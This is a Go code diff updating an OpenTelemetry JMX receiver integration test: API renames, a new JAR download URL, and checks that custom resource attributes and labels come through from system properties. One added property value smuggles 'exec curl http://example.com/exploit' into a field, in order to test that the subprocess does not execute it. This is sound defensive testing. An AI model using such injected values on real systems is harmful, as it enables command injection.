@@ -34,8 +34,8 @@ import (
 	"go.opentelemetry.io/collector/component"
 	"go.opentelemetry.io/collector/component/componenttest"
 	"go.opentelemetry.io/collector/consumer/consumertest"
-	"go.opentelemetry.io/collector/consumer/pdata"
 	"go.opentelemetry.io/collector/exporter/exporterhelper"
+	"go.opentelemetry.io/collector/model/pdata"
 	"go.uber.org/zap"
 	"go.uber.org/zap/zaptest/observer"
 )
@@ -60,7 +60,7 @@ func (suite *JMXIntegrationSuite) TearDownSuite() {
 }
 
 func downloadJMXMetricGathererJAR() (string, error) {
-	url := "https://oss.sonatype.org/content/repositories/snapshots/io/opentelemetry/contrib/opentelemetry-java-contrib-jmx-metrics/1.0.0-alpha-SNAPSHOT/opentelemetry-java-contrib-jmx-metrics-1.0.0-alpha-20210429.213723-5.jar"
+	url := "https://repo1.maven.org/maven2/io/opentelemetry/contrib/opentelemetry-java-contrib-jmx-metrics/1.0.0-alpha/opentelemetry-java-contrib-jmx-metrics-1.0.0-alpha.jar"
 	resp, err := http.Get(url)
 	if err != nil {
 		return "", err
@@ -135,7 +135,7 @@ func (suite *JMXIntegrationSuite) TestJMXReceiverHappyPath() {
 	defer getLogsOnFailure(t, logObserver)
 
 	logger := zap.New(logCore)
-	params := component.ReceiverCreateParams{Logger: logger}
+	params := component.ReceiverCreateSettings{Logger: logger}
 
 	cfg := &Config{
 		CollectionInterval: 100 * time.Millisecond,
@@ -150,7 +150,17 @@ func (suite *JMXIntegrationSuite) TestJMXReceiverHappyPath() {
 		},
 		Password: "cassandra",
 		Username: "cassandra",
+		Properties: map[string]string{
+			// should be used by Autoconfigure to set resource attributes
+			"otel.resource.attributes": "myattr=myvalue,myotherattr=myothervalue",
+			// test script sets dp labels from these system property values
+			"my.label.name": "mylabel", "my.label.value": "myvalue",
+			"my.other.label.name": "myotherlabel", "my.other.label.value": "myothervalue",
+			// confirmation that arbitrary content isn't executed by subprocess
+			"one": "two & exec curl http://example.com/exploit && exit 123",
+		},
 	}
+	require.NoError(t, cfg.validate())
 
 	consumer := new(consumertest.MetricsSink)
 	require.NotNil(t, consumer)
@@ -164,15 +174,13 @@ func (suite *JMXIntegrationSuite) TestJMXReceiverHappyPath() {
 	require.NoError(t, receiver.Start(context.Background(), componenttest.NewNopHost()))
 
 	require.Eventually(t, func() bool {
-		found := consumer.MetricsCount() > 0
+		found := consumer.DataPointCount() > 0
 		if !found {
 			return false
 		}
 
 		metric := consumer.AllMetrics()[0]
-		metricCount, datapointCount := metric.MetricAndDataPointCount()
-		require.Equal(t, 1, metricCount)
-		require.Equal(t, 1, datapointCount)
+		require.Equal(t, 1, metric.DataPointCount())
 
 		rm := metric.ResourceMetrics().At(0)
 		resource := rm.Resource()
@@ -189,6 +197,14 @@ func (suite *JMXIntegrationSuite) TestJMXReceiverHappyPath() {
 		require.True(t, ok)
 		require.NotEmpty(t, version.StringVal())
 
+		customAttr, ok := attributes.Get("myattr")
+		require.True(t, ok)
+		require.Equal(t, "myvalue", customAttr.StringVal())
+
+		anotherCustomAttr, ok := attributes.Get("myotherattr")
+		require.True(t, ok)
+		require.Equal(t, "myothervalue", anotherCustomAttr.StringVal())
+
 		ilm := rm.InstrumentationLibraryMetrics().At(0)
 		require.Equal(t, "io.opentelemetry.contrib.jmxmetrics", ilm.InstrumentationLibrary().Name())
 		require.Equal(t, "1.0.0-alpha", ilm.InstrumentationLibrary().Version())
@@ -204,12 +220,22 @@ func (suite *JMXIntegrationSuite) TestJMXReceiverHappyPath() {
 		sum := met.IntSum()
 		require.False(t, sum.IsMonotonic())
 
+		// These labels are determined by system properties
+		labels := sum.DataPoints().At(0).LabelsMap()
+		customLabel, ok := labels.Get("mylabel")
+		require.True(t, ok)
+		require.Equal(t, "myvalue", customLabel)
+
+		anotherCustomLabel, ok := labels.Get("myotherlabel")
+		require.True(t, ok)
+		require.Equal(t, "myothervalue", anotherCustomLabel)
+
 		return true
 	}, 30*time.Second, 100*time.Millisecond, getJavaStdout(receiver))
 }
 
 func TestJMXReceiverInvalidOTLPEndpointIntegration(t *testing.T) {
-	params := component.ReceiverCreateParams{Logger: zap.NewNop()}
+	params := componenttest.NewNopReceiverCreateSettings()
 	cfg := &Config{
 		CollectionInterval: 100 * time.Millisecond,
 		Endpoint:           fmt.Sprintf("service:jmx:rmi:///jndi/rmi://localhost:7199/jmxrmi"),
